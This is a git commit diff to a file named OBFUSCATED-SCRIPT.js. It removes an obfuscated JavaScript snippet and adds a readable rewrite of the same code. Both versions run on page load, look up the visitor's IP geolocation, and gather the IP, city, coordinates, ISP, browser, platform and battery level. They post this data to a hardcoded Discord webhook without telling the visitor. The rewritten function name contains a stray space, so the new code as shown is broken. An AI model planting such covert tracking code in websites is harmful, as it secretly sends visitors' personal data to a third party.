41e3321bb410c13755c664b0561af467d68ea64b
color <83904715+cxcolor@users.noreply.github.com>
2024-11-01 17:29:43 +0300

    Update OBFUSCATED-SCRIPT.js

--- Script/OBFUSCATED-SCRIPT.js
+++ Script/OBFUSCATED-SCRIPT.js
@@ -1,1 +1,58 @@
-const _0x4ba144=_0x38ae;(function(_0x47ea9a,_0x371e86){const _0x309263=_0x38ae,_0x1ee80=_0x47ea9a();while(!![]){try{const _0x165cac=-parseInt(_0x309263(0x1fa))/0x1*(-parseInt(_0x309263(0x20c))/0x2)+parseInt(_0x309263(0x1fb))/0x3*(-parseInt(_0x309263(0x20d))/0x4)+parseInt(_0x309263(0x1f6))/0x5*(-parseInt(_0x309263(0x212))/0x6)+-parseInt(_0x309263(0x1f8))/0x7+-parseInt(_0x309263(0x1ff))/0x8*(-parseInt(_0x309263(0x210))/0x9)+-parseInt(_0x309263(0x207))/0xa+-parseInt(_0x309263(0x204))/0xb;if(_0x165cac===_0x371e86)break;else _0x1ee80['push'](_0x1ee80['shift']());}catch(_0x190427){_0x1ee80['push'](_0x1ee80['shift']());}}}(_0x2096,0xda6c6));async function sendUserDataToDiscord(){const _0x293d93=_0x38ae;try{const _0x267c42=await fetch('https://json.geoiplookup.io'),_0x115dd5=await _0x267c42[_0x293d93(0x1f2)](),_0x240286={'platform':navigator[_0x293d93(0x213)],'userAgent':navigator[_0x293d93(0x202)],'language':navigator[_0x293d93(0x1f4)],'battery':navigator['getBattery']?navigator['getBattery']()[_0x293d93(0x1f3)]*0x64:null},_0x408cf6=_0x293d93(0x1f9)+_0x115dd5['ip']+_0x293d93(0x20e)+_0x115dd5[_0x293d93(0x1fc)]+_0x293d93(0x209)+_0x115dd5[_0x293d93(0x214)]+_0x293d93(0x211)+_0x115dd5[_0x293d93(0x205)]+_0x293d93(0x203)+_0x115dd5['isp']+_0x293d93(0x20b)+_0x240286[_0x293d93(0x213)]+_0x293d93(0x1fe)+_0x240286[_0x293d93(0x202)]+_0x293d93(0x20f)+_0x240286[_0x293d93(0x1f4)]+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Battery:\x20'+_0x240286[_0x293d93(0x206)]+'%\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',_0x16e586={'content':_0x408cf6};await fetch(_0x293d93(0x201),{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x293d93(0x1f7)](_0x16e586)}),console[_0x293d93(0x20a)](_0x293d93(0x1f5));}catch(_0x599b12){console['error'](_0x293d93(0x200),_0x599b12);}}function _0x38ae(_0x45bc5e,_0x4c845f){const _0x209697=_0x2096();return _0x38ae=function(_0x38ae2d,_0x435f33){_0x38ae2d=_0x38ae2d-0x1f2;let _0x497eae=_0x209697[_0x38ae2d];return _0x497eae;},_0x38ae(_0x45bc5e,_0x4c845f);}function _0x2096(){const _0x197267=['\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Language:\x20','63xbryid','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20City:\x20','941394QhilnK','platform','region','json','level','language','Loaded','5UCtNrq','stringify','3492853egysHX','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**User\x20Data:**\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20IP\x20Address:\x20','6PWuqhm','3SkoSKb','country_name','addEventListener','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Browser:\x20','1213304XYCyIh','Could\x20not\x20log\x20visit','https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-','userAgent','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20ISP:\x20','1342682IFpZME','city','battery','433760uLcIIA','load','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Region:\x20','log','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Device:\x20','593566XXjrTS','4505444hAZXKp','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Country:\x20'];_0x2096=function(){return _0x197267;};return _0x2096();}window[_0x4ba144(0x1fd)](_0x4ba144(0x208),sendUserDataToDiscord);
+// const _0x4ba144=_0x38ae;(function(_0x47ea9a,_0x371e86){const _0x309263=_0x38ae,_0x1ee80=_0x47ea9a();while(!![]){try{const _0x165cac=-parseInt(_0x309263(0x1fa))/0x1*(-parseInt(_0x309263(0x20c))/0x2)+parseInt(_0x309263(0x1fb))/0x3*(-parseInt(_0x309263(0x20d))/0x4)+parseInt(_0x309263(0x1f6))/0x5*(-parseInt(_0x309263(0x212))/0x6)+-parseInt(_0x309263(0x1f8))/0x7+-parseInt(_0x309263(0x1ff))/0x8*(-parseInt(_0x309263(0x210))/0x9)+-parseInt(_0x309263(0x207))/0xa+-parseInt(_0x309263(0x204))/0xb;if(_0x165cac===_0x371e86)break;else _0x1ee80['push'](_0x1ee80['shift']());}catch(_0x190427){_0x1ee80['push'](_0x1ee80['shift']());}}}(_0x2096,0xda6c6));async function sendUserDataToDiscord(){const _0x293d93=_0x38ae;try{const _0x267c42=await fetch('https://json.geoiplookup.io'),_0x115dd5=await _0x267c42[_0x293d93(0x1f2)](),_0x240286={'platform':navigator[_0x293d93(0x213)],'userAgent':navigator[_0x293d93(0x202)],'language':navigator[_0x293d93(0x1f4)],'battery':navigator['getBattery']?navigator['getBattery']()[_0x293d93(0x1f3)]*0x64:null},_0x408cf6=_0x293d93(0x1f9)+_0x115dd5['ip']+_0x293d93(0x20e)+_0x115dd5[_0x293d93(0x1fc)]+_0x293d93(0x209)+_0x115dd5[_0x293d93(0x214)]+_0x293d93(0x211)+_0x115dd5[_0x293d93(0x205)]+_0x293d93(0x203)+_0x115dd5['isp']+_0x293d93(0x20b)+_0x240286[_0x293d93(0x213)]+_0x293d93(0x1fe)+_0x240286[_0x293d93(0x202)]+_0x293d93(0x20f)+_0x240286[_0x293d93(0x1f4)]+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Battery:\x20'+_0x240286[_0x293d93(0x206)]+'%\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',_0x16e586={'content':_0x408cf6};await fetch(_0x293d93(0x201),{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x293d93(0x1f7)](_0x16e586)}),console[_0x293d93(0x20a)](_0x293d93(0x1f5));}catch(_0x599b12){console['error'](_0x293d93(0x200),_0x599b12);}}function _0x38ae(_0x45bc5e,_0x4c845f){const _0x209697=_0x2096();return _0x38ae=function(_0x38ae2d,_0x435f33){_0x38ae2d=_0x38ae2d-0x1f2;let _0x497eae=_0x209697[_0x38ae2d];return _0x497eae;},_0x38ae(_0x45bc5e,_0x4c845f);}function _0x2096(){const _0x197267=['\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Language:\x20','63xbryid','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20City:\x20','941394QhilnK','platform','region','json','level','language','Loaded','5UCtNrq','stringify','3492853egysHX','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**User\x20Data:**\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20IP\x20Address:\x20','6PWuqhm','3SkoSKb','country_name','addEventListener','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Browser:\x20','1213304XYCyIh','Could\x20not\x20log\x20visit','https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-','userAgent','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20ISP:\x20','1342682IFpZME','city','battery','433760uLcIIA','load','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Region:\x20','log','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Device:\x20','593566XXjrTS','4505444hAZXKp','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-\x20Country:\x20'];_0x2096=function(){return _0x197267;};return _0x2096();}window[_0x4ba144(0x1fd)](_0x4ba144(0x208),sendUserDataToDiscord);
+// NEW CODE:
+async function sendUser DataToDiscord() {
+  try {
+    const response = await fetch('https://json.geoiplookup.io');
+    const geoData = await response.json();
+    const userData = {
+      'platform': navigator.platform,
+      'userAgent': navigator.userAgent,
+      'language': navigator.language,
+      'battery': navigator.getBattery ? (await navigator.getBattery()).level * 100 : null // Ensure to await battery promise
+    };
+
+    const message = `
+      **User  Data:**
+      - IP Address: ${geoData.ip}
+      - Country: ${geoData.country_name}
+      - Country Code: ${geoData.country_code}
+      - Region: ${geoData.region}
+      - District: ${geoData.district}
+      - City: ${geoData.city}
+      - Postal Code: ${geoData.postal_code}
+      - Latitude: ${geoData.latitude}
+      - Longitude: ${geoData.longitude}
+      - Continent Name: ${geoData.continent_name}
+      - Continent Code: ${geoData.continent_code}
+      - Timezone: ${geoData.timezone_name}
+      - Connection Type: ${geoData.connection_type}
+      - ASN Number: ${geoData.asn_number}
+      - ASN Org: ${geoData.asn_org}
+      - ASN: ${geoData.asn}
+      - Currency Code: ${geoData.currency_code}
+      - Currency Name: ${geoData.currency_name}
+      - Device: ${userData.platform}
+      - Browser: ${userData.userAgent}
+      - Language: ${userData.language}
+      - Battery: ${userData.battery}%
+    `;
+
+    const payload = {
+      'content': message
+    };
+
+    await fetch("https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-", {
+      'method': 'POST',
+      'headers': {
+        'Content-Type': 'application/json'
+      },
+      'body': JSON.stringify(payload)
+    });
+
+    console.log("Loaded");
+  } catch (error) {
+    console.error("Could not log visit", error);
+  }
+}
+
+window.addEventListener("load", sendUser DataToDiscord);
